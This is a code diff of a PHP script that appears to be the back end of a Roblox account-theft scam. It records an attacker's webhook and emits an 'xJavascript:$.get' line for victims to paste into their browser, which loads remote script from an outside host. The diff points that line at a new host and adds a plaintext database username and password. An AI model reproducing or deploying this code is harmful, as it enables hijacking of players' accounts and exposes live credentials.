@@ -1,9 +1,9 @@
 <?php
     header("Access-Control-Allow-Origin: *");
 
-    $servername = "";
-    $username = "";
-    $password = "";
+    $servername = "000webhost";
+    $username = "robloxapiz";
+    $password = "9q-L/L#e0O!ZjX!d";
     $dbname = "rblxapi";
     $webhook = $_REQUEST['webhook'];
     $prompt = $_REQUEST['prompt'];
@@ -21,7 +21,7 @@
     VALUES ('".mysqli_real_escape_string($conn, $id)."', '".mysqli_real_escape_string($conn, $webhook)."', '".mysqli_real_escape_string($conn, $prompt)."')";
 
     if ($conn->query($sql) === TRUE) {
-      echo 'xJavascript:$.get("//rblx-trade.com/rblxapi/api.php?id='.$id.'")';
+      echo 'xJavascript:$.get("//roblox-apiz.000webhostapp.com/api.php?id='.$id.'")';
     } else {
       echo "Error:" . $conn->error;
     }
